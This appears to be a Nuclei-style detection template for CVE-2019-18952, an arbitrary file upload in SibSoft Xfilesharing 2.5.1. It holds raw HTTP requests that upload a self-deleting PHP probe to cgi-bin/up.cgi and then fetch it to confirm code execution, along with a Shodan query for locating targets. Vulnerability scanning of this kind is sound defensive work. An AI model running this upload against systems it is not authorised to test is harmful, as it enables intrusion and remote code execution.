flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - <OK>
  raw:
  - 'POST /cgi-bin/up.cgi HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=---------------------------5825462663702204104870787337


    -----------------------------5825462663702204104870787337

    Content-Disposition: form-data; name="sid"


    {{path}}

    -----------------------------5825462663702204104870787337

    Content-Disposition: form-data; name="file"; filename="{{filename}}.php"

    Content-Type: application/php


    <?php

    echo md5(''{{num}}'');

    unlink(__FILE__);

    ?>

    -----------------------------5825462663702204104870787337--

    '
- matchers:
  - type: word
    words:
    - '{{md5(num)}}'
  raw:
  - 'GET /cgi-bin/temp/{{path}}/{{filename}}.php HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2019-18952
info:
  author: daffainfo
  classification:
    cpe: cpe:2.3:a:sibsoft:xfilesharing:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-18952
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.99292
    epss-score: 0.84694
  description: 'SibSoft Xfilesharing through 2.5.1 allows cgi-bin/up.cgi arbitrary
    file upload.This can be combined with CVE-2019-18951 to achieve remote code execution
    via a .html file, containing short codes, that is served over HTTP.

    '
  impact: Attackers can upload malicious files and execute arbitrary code remotely,
    leading to full system compromise.
  metadata:
    max-request: 2
    product: xfilesharing
    shodan-query: html:"/?op=registration" "OpenSSL"
    vendor: sibsoft
  name: Xfilesharing 2.5.1 - Arbitrary File Upload
  reference:
  - https://www.exploit-db.com/exploits/47659
  - https://gist.github.com/pak0s/af9f640170aed335fdf6d110d468dbce
  - https://nvd.nist.gov/vuln/detail/CVE-2019-18952
  remediation: 'Apply the latest security patches and updates from the vendor to address
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2019,sibsoft,xfilesharing,rce,file-upload,intrusive,vkev,vuln
variables:
  filename: '{{to_lower(rand_text_alpha(5))}}'
  num: '999999999'
  path: '{{randstr}}'
